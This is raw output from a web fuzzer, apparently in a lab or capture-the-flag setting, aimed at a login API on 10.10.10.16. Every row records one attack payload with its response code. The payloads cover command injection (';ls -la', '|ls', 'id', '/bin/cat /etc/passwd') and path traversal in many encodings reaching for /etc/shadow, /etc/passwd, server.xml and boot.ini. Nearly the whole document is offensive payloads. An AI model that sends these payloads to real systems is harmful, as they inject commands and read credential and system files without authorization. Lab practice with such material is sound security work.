Target: http://10.10.10.16/api/login
Total requests: 468
==============================================================================================================================================
ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Payload    
==============================================================================================================================================
00042:  0.051s   C=00042:  C=400      0 L	       2 W	     21 Ch                                                                              "&quot;;id&quot;"
00050:  0.049s   C=00050:  C=400      0 L	       2 W	     21 Ch                                                                              ";ls -la"
00048:  0.050s   C=00048:  C=200      0 L	       2 W	     21 Ch                                                                              "|ls"
00051:  0.050s   C=00051:  C=400      0 L	       2 W	     21 Ch                                                                              ";dir"
00044:  0.051s   C=00044:  C=200      0 L	       2 W	     21 Ch                                                                              "id%00|"
00105:  0.051s   C=00105:  C=200      0 L	       2 W	     21 Ch                                                                              "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini"
00108:  0.052s   C=00108:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../conf/server.xml"
00076:  0.053s   C=00076:  C=200      0 L	       2 W	     21 Ch                                                                              "/./././././././././././etc/shadow"
00106:  0.052s   C=00106:  C=200      0 L	       2 W	     21 Ch                                                                              "\\&apos;/bin/cat%20/etc/passwd\\&apos;"
00070:  0.103s   C=00070:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../etc/shadow"
00084:  0.052s   C=00084:  C=200      0 L	       2 W	     21 Ch                                                                              ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow"
00107:  0.052s   C=00107:  C=200      0 L	       2 W	     21 Ch                                                                              "\\&apos;/bin/cat%20/etc/shadow\\&apos;"
00104:  0.051s   C=00104:  C=400      0 L	       2 W	     21 Ch                                                                              "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini"
00100:  0.052s   C=00100:  C=200      0 L	       2 W	     21 Ch                                                                              "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
00072:  0.054s   C=00072:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../etc/shadow^^"
00103:  0.051s   C=00103:  C=400      0 L	       2 W	     21 Ch                                                                              "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00"
00095:  0.051s   C=00095:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../../etc/passwd%00.jpg"
00098:  0.051s   C=00098:  C=200      0 L	       2 W	     21 Ch                                                                              "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow"
00093:  0.051s   C=00093:  C=200      0 L	       2 W	     21 Ch                                                                              "%00../../../../../../etc/passwd"
